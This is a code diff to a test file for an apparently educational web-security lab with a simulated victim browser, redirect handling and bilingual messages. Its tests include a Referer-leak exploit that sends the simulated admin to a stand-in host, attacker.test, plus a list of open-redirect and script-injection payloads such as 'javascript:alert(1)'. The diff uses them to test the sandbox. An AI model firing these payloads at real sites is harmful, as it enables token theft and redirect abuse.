@@ -14,10 +14,12 @@ import { flagFor } from '../src/core/mount.js';
 import { defineChallenge, register } from '../src/core/registry.js';
 import { sendPage } from '../src/core/render.js';
 import {
-  ADMIN_MAILBOX, PLAYER_MAILBOX, VICTIM_LABELS, simWorld,
-  type SimBrowser, type SimRequest, type SimResponse, type SimWorld,
+  ADMIN_MAILBOX, PLAYER_MAILBOX, SIM_LIMITS, checkMailAction, sendLinkAction, sendSimRedirect, simWorld,
+  type SimBrowser, type SimRedirectStatus, type SimRequest, type SimResponse, type SimWorld,
 } from '../src/core/sim.js';
-import { FLAG_RE, bare, describeExploitMatrix, describeLabView, freshSession, type Agent } from './helpers.js';
+import {
+  FLAG_RE, attackerHits, bare, describeExploitMatrix, describeLabView, freshSession, panelOf, referers, type Agent,
+} from './helpers.js';
 
 const view = join(dirname(fileURLToPath(import.meta.url)), 'fixtures', 'sim-courier.ejs');
 const hello = join(dirname(fileURLToPath(import.meta.url)), 'fixtures', 'hello.ejs');
@@ -46,6 +48,12 @@ function citadel(level: Level, lab: Courier, r: SimRequest): SimResponse {
       headers: { ...(next ? { Refresh: `0; url=${next}` } : {}), ...(policy ? { 'Referrer-Policy': policy } : {}) },
     };
   }
+  if (r.path === '/logout') return { status: 200, headers: { 'Set-Cookie': 'courier_session=; Max-Age=0; Path=/' }, body: 'Signed out.' };
+  if (r.path === '/crumbs') { // a page that sets more cookies than the jar holds: the oldest (the admin's session) goes
+    return { status: 200, headers: { 'Set-Cookie': Array.from({ length: 25 }, (_, i) => `crumb${i}=${i}; Path=/`) }, body: 'Crumbs.' };
+  }
+  if (r.path === '/loop') return { status: 302, headers: { Location: '/loop' } };
+  if (r.path === '/deeper') return { status: 302, headers: { Location: `/deeper?n=${Number(r.query.get('n') ?? 0) + 1}` } };
   if (r.path === '/') return { status: 200, body: 'Courier home' };
   return { status: 404, body: 'Not found' };
 }
@@ -66,6 +74,8 @@ const labs = perSession((level): Courier => {
   return lab;
 });
 const labFor = (req: { sessionId: string; level: Level }): Courier => labs.for(req);
+/** The admin starts every action signed in, whatever the player's last link did (no Restart on this lab). */
+const rearm = (_req: Request, admin: SimBrowser): void => { admin.cookies.set('courier_session', 'admin'); };
 
 const COURIER = register(defineChallenge({
   id: 'SV-01', district: 'sim-test', slug: 'courier', dir: process.cwd(),
@@ -74,23 +84,21 @@ const COURIER = register(defineChallenge({
   victim: {
     sim: (req) => labFor(req).world,
     actions: [
-      {
-        name: 'check-mail', label: VICTIM_LABELS.checkMail,
-        run: (req) => {
-          const lab = labFor(req);
-          const link = lab.world.inbox.newest(ADMIN_MAILBOX)?.links[0];
-          if (link === undefined) return 'The admin has no mail with a link.';
-          lab.admin.follow(link);
-          return 'The admin opened the newest mail and clicked its first link.';
-        },
-      },
-      { name: 'send-link', label: VICTIM_LABELS.sendLink, input: 'url', run: (req, { url }) => { labFor(req).admin.follow(url); } },
+      checkMailAction({ browser: (req) => labFor(req).admin, mailbox: ADMIN_MAILBOX, rearm }),
+      sendLinkAction((req) => labFor(req).admin, { rearm }),
     ],
   },
   mount: (router) => {
     const show = (res: Response, result: { ok: boolean; text: string } | null, key: string) =>
       sendPage(res, view, { account: { username: 'pilgrim', password: 'pilgrim' }, result, key });
     router.get('/', (_req, res) => show(res, null, ''));
+    // A real route answering with a Location a level function made (a sim URL): sendSimRedirect, never res.redirect.
+    const go = (req: Request, res: Response) => sendSimRedirect(
+      res, typeof req.query.to === 'string' ? req.query.to : '', (Number(req.query.status) || 302) as SimRedirectStatus,
+    );
+    router.get('/go', go);
+    router.get('/idp/go', go); // a nested route: a relative Location resolves against /idp/go
+    router.get('/go-odd', (_req, res) => sendSimRedirect(res, 42 as never)); // a level that answered a non-string
     router.post('/', async (req: Request, res) => {
       const key = field(req, 'key');
       const ok = key !== '' && key === labFor(req).key;
@@ -108,18 +116,38 @@ register(defineChallenge({
 }));
 
 // A lab whose victim misbehaves: an async action (a programming error) and an over-long note.
-const misbehaving = perSession(() => simWorld());
+const misbehaving = perSession(() => {
+  const world = simWorld();
+  return { world, victim: world.browser((r) => ({ status: 200, body: r.path })) };
+});
+const visitAll = (req: Request, n: number): void => {
+  for (let i = 1; i <= n; i++) misbehaving.for(req).victim.follow(`http://citadel.test/v${i}`);
+};
 register(defineChallenge({
   id: 'SV-03', district: 'sim-test', slug: 'misbehaving', dir: process.cwd(),
   title: { id: 't', en: 't' }, summary: { id: 's', en: 's' }, maps: [], levels: ['acolyte', 'divine'], hints: [],
   victim: {
-    sim: (req) => misbehaving.for(req),
+    sim: (req) => misbehaving.for(req).world,
     actions: [
+      { name: 'seven', label: { id: '7', en: '7' }, run: (req) => { visitAll(req, 7); } },
+      { name: 'one', label: { id: '1', en: '1' }, run: (req) => { visitAll(req, 1); } },
+      { name: 'throws', label: { id: 't', en: 't' }, run: (req) => { visitAll(req, 1); throw new Error('lab bug'); } },
+      { name: 'throws-early', label: { id: 'e', en: 'e' }, run: () => { throw new Error('lab bug'); } },
       { name: 'async', label: { id: 'a', en: 'a' }, run: (() => Promise.resolve('late')) as never },
       { name: 'chatty', label: { id: 'c', en: 'c' }, run: () => `${'n'.repeat(5000)}END` },
+      {
+        name: 'bilingual', label: { id: 'b', en: 'b' },
+        description: { id: 'membuka surat terbaru, saat masuk ke Pilgrim-ID', en: 'opens the newest mail, while signed in to Pilgrim-ID' },
+        run: () => ({ id: `Admin belum masuk.${'i'.repeat(600)}`, en: `The admin was not signed in.${'e'.repeat(600)}` }),
+      },
+      { name: 'odd-note', label: { id: 'o', en: 'o' }, run: (() => ({ en: 'only English' })) as never },
     ],
   },
-  mount: (router) => { router.get('/', (_req, res) => sendPage(res, hello, { name: 'misbehaving' })); },
+  mount: (router) => {
+    router.get('/', (_req, res) => sendPage(res, hello, { name: 'misbehaving' }));
+    // A lab route that makes the victim browse outside any victim action (e.g. "the admin reviews your profile").
+    router.post('/browse', (req, res) => { visitAll(req, 2); res.redirect(303, `/d/sim-test/misbehaving?level=${req.level}`); });
+  },
 }));
 
 // --- Player helpers --------------------------------------------------------------------------------------------
@@ -128,11 +156,6 @@ const sendLink = (agent: Agent, level: Level, url: unknown) =>
   agent.post(`${LAB}/victim/send-link?level=${level}`).type('form').send({ url: url as string });
 const checkMail = (agent: Agent, level: Level) => agent.post(`${LAB}/victim/check-mail?level=${level}`);
 const labPage = (agent: Agent, level: Level, lang = 'en') => agent.get(`${LAB}?level=${level}&lang=${lang}`);
-const panelOf = (html: string): string => /<section class="sim-panel"[\s\S]*?<\/section>/.exec(html)?.[0] ?? '';
-const unescapeHtml = (s: string) => s
-  .replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&#34;|&quot;/g, '"').replace(/&#39;/g, "'").replace(/&amp;/g, '&');
-/** What the player's server received: every Referer shown on the lab page, unescaped. */
-const referers = (html: string): string[] => [...panelOf(html).matchAll(/Referer: <code>([^<]*)<\/code>/g)].map((m) => unescapeHtml(m[1]));
 
 type Script = (agent: Agent, level: Level, sid: string) => Promise<request.Response>;
 
@@ -140,7 +163,7 @@ type Script = (agent: Agent, level: Level, sid: string) => Promise<request.Respo
 const exploit: Script = async (agent, level) => {
   await sendLink(agent, level, 'http://citadel.test/continue?next=http://attacker.test/collect');
   const page = await labPage(agent, level);
-  const ref = referers(page.text).find((r) => r.includes('key='));
+  const ref = attackerHits(page.text).find((h) => h.url === 'http://attacker.test/collect')?.referer;
   const key = ref === undefined ? 'none' : new URL(ref).searchParams.get('key') ?? 'none';
   return agent.post(`${LAB}?level=${level}`).type('form').send({ key });
 };
@@ -199,6 +222,18 @@ describe('victim-driven lab: the full pattern over HTTP', () => {
     expect(vault.text).toMatch(FLAG_RE);
   });
 
+  it('attackerHits reads exactly what the attacker log holds (method, URL, Referer, body, time; oldest first)', async () => {
+    const { agent, sid } = await freshSession();
+    const lab = labFor({ sessionId: sid, level: 'acolyte' });
+    lab.world.now = () => Date.UTC(2026, 10, 15, 12, 0, 0);
+    lab.world.attackerLog.record({ method: 'POST', url: 'http://attacker.test/p?a=1&b=2', body: `code=a&x=<"'>` });
+    await sendLink(agent, 'acolyte', 'http://citadel.test/continue?next=http://attacker.test/collect');
+    const hits = attackerHits((await labPage(agent, 'acolyte', 'id')).text); // the body label is translated
+    expect(hits.find((h) => h.method === 'GET')?.referer).toContain(`key=${lab.key}`);
+    expect(hits).toEqual(lab.world.attackerLog.entries().map((e) => ({ ...e, at: new Date(e.at).toISOString() })));
+    expect(hits.map((h) => h.seq)).toEqual([1, 2]);
+  });
+
   it('divine: the same link reaches your server, but with no Referer, so no key', async () => {
     const { agent } = await freshSession();
     await sendLink(agent, 'divine', 'http://citadel.test/continue?next=http://attacker.test/collect');
@@ -216,7 +251,8 @@ describe('victim-driven lab: the full pattern over HTTP', () => {
     const page = await labPage(agent, 'acolyte');
     expect(page.text).not.toContain(lab.key);
     const panel = panelOf(page.text);
-    expect(panel).toContain('The admin opened the newest mail and clicked its first link.');
+    expect(panel).toContain('<p class="sim-action-description">opens the newest mail and clicks its first link</p>');
+    expect(panel).not.toContain('class="sim-note"'); // the summary says it all
     expect(panel).toContain('Visit 1: 3 request(s); ended on a citadel.test page (HTTP 200).');
     expect(panel).toContain('No requests yet.');
   });
@@ -245,6 +281,17 @@ describe('victim-driven lab: the full pattern over HTTP', () => {
     expect(panelOf((await labPage(b.agent, 'acolyte')).text)).not.toContain('only-a');
     expect(panelOf((await labPage(a.agent, 'divine')).text)).not.toContain('only-a');
     expect(panelOf((await labPage(a.agent, 'acolyte')).text)).toContain('only-a');
+  });
+
+  it('a link that signs the admin out (/logout, or a cookie flood) never leaves the lab stuck: every action re-arms', async () => {
+    const { agent, sid } = await freshSession();
+    const lab = labFor({ sessionId: sid, level: 'acolyte' });
+    for (const signOut of ['http://citadel.test/logout', 'http://citadel.test/crumbs']) {
+      await sendLink(agent, 'acolyte', signOut);
+      expect(lab.admin.cookies.get('courier_session'), signOut).toBeUndefined(); // signed out (or evicted from the jar)
+      const res = await exploit(agent, 'acolyte', sid); // the next action signs the admin back in first
+      expect(res.text, signOut).toMatch(FLAG_RE);
+    }
   });
 
   it('every action is a no-JS POST form to <lab>/victim/<name>?level=<level> on the canonical path', async () => {
@@ -303,10 +350,34 @@ describe('victim-driven lab: the full pattern over HTTP', () => {
     }
   });
 
+  it('every outcome and every unreachable reason is told in both languages (never a raw key)', async () => {
+    const { agent } = await freshSession();
+    const cases: [string, string, string][] = [ // link, English, Indonesian
+      ['http://citadel.test/', 'ended on a citadel.test page (HTTP 200)', 'berakhir di halaman citadel.test (HTTP 200)'],
+      ['http://attacker.test/', 'reached your server (attacker.test)', 'sampai di server Anda (attacker.test)'],
+      ['http://citadel.test/deeper', `stopped: more than ${SIM_LIMITS.maxRedirects} redirects`, `berhenti: lebih dari ${SIM_LIMITS.maxRedirects} pengalihan`],
+      ['http://citadel.test/loop', 'stopped: redirect loop', 'berhenti: pengalihan berputar-putar'],
+      ['nope', 'not a valid absolute URL', 'bukan URL absolut yang valid'],
+      [`http://attacker.test/${'a'.repeat(SIM_LIMITS.urlLength)}`, 'the URL is too long', 'URL terlalu panjang'],
+      ['javascript:1', 'only http(s) links are followed', 'hanya tautan http(s) yang diikuti'],
+      ['http://127.0.0.1/', 'IP addresses are unreachable', 'alamat IP tidak dapat dijangkau'],
+      ['http://citadel.test:81/', 'nothing listens on that citadel.test port', 'tidak ada layanan di port citadel.test itu'],
+      ['http://example.com/', 'unknown host', 'host tidak dikenal'],
+    ];
+    for (const [link, en, id] of cases) {
+      await sendLink(agent, 'acolyte', link);
+      const enPanel = panelOf((await labPage(agent, 'acolyte', 'en')).text);
+      const idPanel = panelOf((await labPage(agent, 'acolyte', 'id')).text);
+      expect(enPanel, link).toContain(en);
+      expect(idPanel, link).toContain(id);
+      expect(`${enPanel}${idPanel}`, link).not.toMatch(/sim\.(outcome|reason)\./);
+    }
+  });
+
   it('platform strings come in both languages', async () => {
     const { agent } = await freshSession();
     const id = panelOf((await labPage(agent, 'acolyte', 'id')).text);
-    for (const s of ['Korban tersimulasi', 'Kotak surat Anda (pilgrim@citadel.test)', 'Server Anda (attacker.test) menerima…', 'Minta admin memeriksa email', 'Kirim tautan ke admin', 'buka di lab', 'Belum ada permintaan.']) {
+    for (const s of ['Korban tersimulasi', 'Kotak surat Anda (pilgrim@citadel.test)', 'Server Anda (attacker.test) menerima…', 'Minta admin memeriksa email', 'Kirim tautan ke admin', 'buka di lab', 'Belum ada permintaan.', 'membuka surat terbaru dan mengklik tautan pertamanya', 'membuka tautan apa pun yang Anda kirim']) {
       expect(id).toContain(s);
     }
     expect(id).toContain(`(lab ini: http://citadel.test/&lt;path&gt; adalah ${LAB}/&lt;path&gt;)`);
@@ -339,6 +410,134 @@ describe('victim-driven lab: the full pattern over HTTP', () => {
   });
 });
 
+describe('sendSimRedirect: the player\'s real browser never leaves the lab', () => {
+  const go = (agent: Agent, level: Level, to: string, lang = 'en', status?: number) =>
+    agent.get(`${LAB}/go?level=${level}&lang=${lang}&to=${encodeURIComponent(to)}${status ? `&status=${status}` : ''}`);
+  const awayOf = (html: string): string => /<section class="sim-away"[\s\S]*?<\/section>/.exec(html)?.[0] ?? '';
+
+  it('a citadel URL (absolute, relative, or a lab path a level built) goes to the same place in the lab, at the served level', async () => {
+    const { agent } = await freshSession();
+    const want = `${LAB}/callback?code=abc&level=acolyte`;
+    for (const [to, location] of [
+      ['http://citadel.test/callback?code=abc', want],
+      ['HTTP://CITADEL.TEST/callback?code=abc#frag', want],
+      ['/callback?code=abc', want],
+      ['callback?code=abc', want], // relative to the citadel twin of this route (/go)
+      [`${LAB}/callback?code=abc&level=divine`, want], // built with base labPath(res): the served level wins
+      [`${LAB}?tab=home`, `${LAB}?tab=home&level=acolyte`],
+      ['http://citadel.test/', `${LAB}?level=acolyte`],
+      [`${LAB}/../../evil`, `${LAB}/evil?level=acolyte`],
+    ]) {
+      const res = await go(agent, 'acolyte', to);
+      expect(res.status, to).toBe(302);
+      expect(res.headers.location, to).toBe(location);
+    }
+    const divine = await go(agent, 'divine', 'http://citadel.test/callback?code=abc', 'en', 303);
+    expect(divine.status).toBe(303);
+    expect(divine.headers.location).toBe(`${LAB}/callback?code=abc&level=divine`);
+  });
+
+  it('an attacker.test URL gets a page saying where the browser would go, as escaped text, never followed', async () => {
+    const { agent } = await freshSession();
+    const res = await go(agent, 'acolyte', 'http://attacker.test/collect?code=abc&x="><b>x</b>');
+    expect(res.status).toBe(200);
+    expect(res.headers.location).toBeUndefined();
+    expect(res.headers.refresh).toBeUndefined();
+    expect(res.text).not.toMatch(/http-equiv|<b>x/i);
+    const away = awayOf(res.text);
+    expect(away).toContain('<code>http://attacker.test/collect?code=abc&amp;x=%22%3E%3Cb%3Ex%3C/b%3E</code>');
+    expect(away).not.toMatch(/<a\b|href=|<form|<script/);
+    expect(away).toContain('Your browser would now go to');
+    expect(away).toContain('simulated victim&#39;s browser goes there, not yours');
+    expect(res.text).toContain('data-testid="sim-panel"'); // the attacker log is right below
+    const id = awayOf((await go(agent, 'acolyte', 'http://attacker.test/x', 'id')).text);
+    expect(id).toContain('Peramban Anda sekarang akan menuju');
+    expect(id).toContain('<code>http://attacker.test/x</code>');
+  });
+
+  it('no attacker or other URL ever answers a real redirect off the lab', async () => {
+    const { agent } = await freshSession();
+    const tricks = [
+      'http://attacker.test/x', 'https://evil.attacker.test:8443/x', '//attacker.test/x', '/\\attacker.test/x', '\\\\attacker.test/x',
+      'http://citadel.test@attacker.test/', 'http://attacker.test\\@citadel.test/', ' http://attacker.test/', 'http:\t//attacker.test/',
+      'javascript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'http://localhost:3000/', 'http://127.0.0.1/',
+      'http://[::1]/', 'http://citadel.test:8080/', 'http://citadel.test.attacker.test/', 'https://example.com/', `http://attacker.test/${'a'.repeat(5000)}`,
+      `${LAB}@attacker.test/`, `${LAB}.attacker.test/`, '/d/sim-test/courierx/x', '', ' ', '\t\n',
+    ];
+    for (const to of tricks) {
+      const res = await go(agent, 'acolyte', to);
+      if (res.status >= 300 && res.status < 400) {
+        const loc = String(res.headers.location);
+        expect(loc, to).toMatch(new RegExp(`^${LAB}[/?]`));
+        expect(new URL(loc, 'http://127.0.0.1:1/').origin, to).toBe('http://127.0.0.1:1');
+      } else {
+        expect(res.status, to).toBe(200);
+        expect(res.headers.location, to).toBeUndefined();
+        expect(awayOf(res.text), to).not.toMatch(/href=/);
+      }
+    }
+  });
+});
+
+describe('sendSimRedirect: exact mapping', () => {
+  it('a path that only starts like the lab path is a citadel path (a lab path needs a separator after the base)', async () => {
+    const { agent } = await freshSession();
+    for (const [to, location] of [
+      ['/d/sim-test/courierx/x', `${LAB}/d/sim-test/courierx/x?level=acolyte`],
+      [`${LAB}x/y`, `${LAB}/d/sim-test/courierx/y?level=acolyte`],
+      [LAB, `${LAB}?level=acolyte`],
+      [`${LAB}#top`, `${LAB}?level=acolyte`],
+    ]) {
+      const res = await agent.get(`${LAB}/go?level=acolyte&to=${encodeURIComponent(to)}`);
+      expect(res.status, to).toBe(302);
+      expect(res.headers.location, to).toBe(location);
+    }
+  });
+
+  it('a relative Location resolves against the citadel twin of the route that answered it (a nested route too)', async () => {
+    const { agent } = await freshSession();
+    for (const [route, to, location] of [
+      ['/idp/go', 'callback?code=1', `${LAB}/idp/callback?code=1&level=acolyte`],
+      ['/idp/go', '../callback', `${LAB}/callback?level=acolyte`],
+      ['/idp/go', '/callback', `${LAB}/callback?level=acolyte`],
+      ['/go', 'callback', `${LAB}/callback?level=acolyte`],
+    ]) {
+      const res = await agent.get(`${LAB}${route}?level=acolyte&to=${encodeURIComponent(to)}`);
+      expect(res.headers.location, `${route} ${to}`).toBe(location);
+    }
+  });
+
+  it('a status that is not a redirect is a programming error (stack-free 500), never a response with that status', async () => {
+    const { agent } = await freshSession();
+    for (const status of [200, 300, 304, 305, 399, 404]) {
+      const res = await agent.get(`${LAB}/go?level=acolyte&status=${status}&to=${encodeURIComponent('http://citadel.test/x')}`);
+      expect(res.status, String(status)).toBe(500);
+      expect(res.headers.location, String(status)).toBeUndefined();
+      expect(res.text, String(status)).not.toMatch(/at |victim\.ts|sendSimRedirect/);
+    }
+  });
+});
+
+describe('sendSimRedirect: no target', () => {
+  it('an empty, blank or non-string Location never redirects (it would loop to this route): a page says there is no target', async () => {
+    const { agent } = await freshSession();
+    const urls = [
+      ...['', ' ', '\t\n ', '\u0000 '].map((to) => `${LAB}/go?level=acolyte&lang=en&to=${encodeURIComponent(to)}`),
+      `${LAB}/go?level=acolyte&lang=en`, `${LAB}/go-odd?level=acolyte&lang=en`,
+    ];
+    for (const url of urls) {
+      const res = await agent.get(url);
+      expect(res.status, url).toBe(200);
+      expect(res.headers.location, url).toBeUndefined();
+      const away = /<section class="sim-away"[\s\S]*?<\/section>/.exec(res.text)?.[0] ?? '';
+      expect(away, url).toContain('This redirect has no target');
+      expect(away, url).not.toMatch(/href=|<code>/);
+    }
+    const id = await agent.get(`${LAB}/go?level=acolyte&lang=id&to=`);
+    expect(id.text).toContain('Pengalihan ini tidak punya tujuan');
+  });
+});
+
 describe('victim plumbing', () => {
   it('a lab without a victim has no panel and no victim routes', async () => {
     const { agent } = await freshSession();
@@ -346,6 +545,78 @@ describe('victim plumbing', () => {
     expect(page.status).toBe(200);
     expect(page.text).not.toContain('sim-panel');
     expect((await agent.post('/d/sim-test/plain/victim/send-link?level=acolyte')).status).toBe(404);
+  });
+
+  it('a note may be bilingual Text (shown in the player\'s language, clipped); an action may describe its victim', async () => {
+    const { agent } = await freshSession();
+    const panelIn = async (lang: string) => panelOf((await agent.get(`/d/sim-test/misbehaving?level=acolyte&lang=${lang}`)).text);
+    const before = await panelIn('en');
+    expect(before).toMatch(/<button type="submit">b<\/button>\s*<p class="sim-action-description">opens the newest mail, while signed in to Pilgrim-ID<\/p>/);
+    expect(await panelIn('id')).toContain('<p class="sim-action-description">membuka surat terbaru, saat masuk ke Pilgrim-ID</p>');
+    expect(before).not.toMatch(/sim-action-description">\s*</); // actions without a description show none
+    expect((await agent.post('/d/sim-test/misbehaving/victim/bilingual?level=acolyte')).status).toBe(303);
+    const en = await panelIn('en');
+    expect(en).toContain(`<p class="sim-note">The admin was not signed in.${'e'.repeat(SIM_LIMITS.noteLength - 28)}</p>`);
+    expect(en).not.toContain('Admin belum masuk');
+    const id = await panelIn('id');
+    expect(id).toContain(`<p class="sim-note">Admin belum masuk.${'i'.repeat(SIM_LIMITS.noteLength - 18)}</p>`);
+    expect(id).not.toContain('The admin was not signed in');
+  });
+
+  it('a note that is neither a string nor Text { id, en } is a programming error (stack-free 500)', async () => {
+    const { agent } = await freshSession();
+    const res = await agent.post('/d/sim-test/misbehaving/victim/odd-note?level=acolyte');
+    expect(res.status).toBe(500);
+    expect(res.text).not.toMatch(/at |sim\.ts/);
+  });
+
+  it('the report numbers an action\'s visits stably: beyond the last 5 it says how many earlier ones are not shown', async () => {
+    const { agent } = await freshSession();
+    expect((await agent.post('/d/sim-test/misbehaving/victim/seven?level=acolyte')).status).toBe(303);
+    const panel = panelOf((await agent.get('/d/sim-test/misbehaving?level=acolyte&lang=en')).text);
+    for (let n = 3; n <= 7; n++) expect(panel).toContain(`Visit ${n}: 1 request(s); ended on a citadel.test page (HTTP 200).`);
+    expect(panel).not.toMatch(/Visit [12]:/);
+    expect(panel).toContain('2 earlier visit(s) not shown.');
+    const id = panelOf((await agent.get('/d/sim-test/misbehaving?level=acolyte&lang=id')).text);
+    expect(id).toContain('2 kunjungan sebelumnya tidak ditampilkan.');
+  });
+
+  it('the report shows only the visits made during the action, not ones a lab route made afterwards', async () => {
+    const { agent, sid } = await freshSession();
+    await agent.post('/d/sim-test/misbehaving/victim/one?level=acolyte');
+    expect((await agent.post('/d/sim-test/misbehaving/browse?level=acolyte')).status).toBe(303);
+    const panel = panelOf((await agent.get('/d/sim-test/misbehaving?level=acolyte&lang=en')).text);
+    expect(panel).toContain('Visit 1: 1 request(s)');
+    expect(panel).not.toContain('Visit 2:');
+    expect(misbehaving.for({ sessionId: sid, level: 'acolyte' }).world.visits.map((v) => v.page?.body)).toEqual(['/v1', '/v1', '/v2']);
+  });
+
+  it('a run that throws is a stack-free 500, and the report says the action failed (not "opened nothing")', async () => {
+    const { agent } = await freshSession();
+    for (const [action, visits] of [['throws', 1], ['throws-early', 0]] as const) {
+      const res = await agent.post(`/d/sim-test/misbehaving/victim/${action}?level=acolyte`);
+      expect(res.status, action).toBe(500);
+      expect(res.text, action).not.toMatch(/lab bug|at |sim\.ts/);
+      const panel = panelOf((await agent.get('/d/sim-test/misbehaving?level=acolyte&lang=en')).text);
+      expect(panel, action).toContain('The victim&#39;s action failed (an error in the lab).');
+      expect(panel, action).not.toContain('opened nothing');
+      expect(panel.includes('Visit 1: 1 request(s)'), action).toBe(visits === 1);
+      const id = panelOf((await agent.get('/d/sim-test/misbehaving?level=acolyte&lang=id')).text);
+      expect(id, action).toContain('Aksi korban gagal (galat di lab).');
+    }
+    await agent.post('/d/sim-test/misbehaving/victim/one?level=acolyte'); // the next action that works clears it
+    expect(panelOf((await agent.get('/d/sim-test/misbehaving?level=acolyte&lang=en')).text)).not.toContain('action failed');
+  });
+
+  it('an over-long link stays over-long in the field, so sending it again is still refused', async () => {
+    const { agent } = await freshSession();
+    await sendLink(agent, 'acolyte', `http://attacker.test/${'a'.repeat(3000)}`);
+    const value = /<input name="url" type="text"[^>]*value="([^"]*)"/.exec(panelOf((await labPage(agent, 'acolyte')).text))?.[1] ?? '';
+    expect(value.length).toBe(SIM_LIMITS.urlLength + 1);
+    await sendLink(agent, 'acolyte', value);
+    const panel = panelOf((await labPage(agent, 'acolyte')).text);
+    expect(panel).toContain('Visit 1: 0 request(s); stopped: the URL is too long.');
+    expect(panel).toContain('No requests yet.');
   });
 
   it('an async victim action is a programming error (stack-free 500); a long note is clipped', async () => {
